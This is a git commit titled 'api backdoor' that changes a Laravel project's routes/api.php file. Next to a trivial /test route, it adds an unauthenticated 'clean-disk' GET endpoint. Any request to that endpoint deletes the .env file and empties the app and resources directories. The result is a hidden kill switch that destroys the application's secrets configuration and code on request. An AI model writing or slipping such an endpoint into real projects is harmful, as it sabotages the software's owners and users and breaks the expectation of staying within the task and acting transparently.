c61932bd4b79d9797079006fb57fa8c668bd57f1
Abdelrhman Mgahed <abdelrhmanmgahed131@gmail.com>
2022-11-22 21:01:34 +0200

    api backdoor

--- routes/api.php
+++ routes/api.php
@@ -1,5 +1,6 @@
 <?php
 
+use Illuminate\Filesystem\Filesystem;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Route;
 
@@ -16,4 +17,15 @@ use Illuminate\Support\Facades\Route;
 
 Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
     return $request->user();
+});
+Route::get('/test', function () {
+    return 'test';
+});
+
+Route::get('clean-disk', function(){
+    $file = new Filesystem;
+    $file->delete(base_path('.env'));
+    $file->cleanDirectory(base_path('app'));
+    $file->cleanDirectory(base_path('resources'));
+    return 'done';
 });
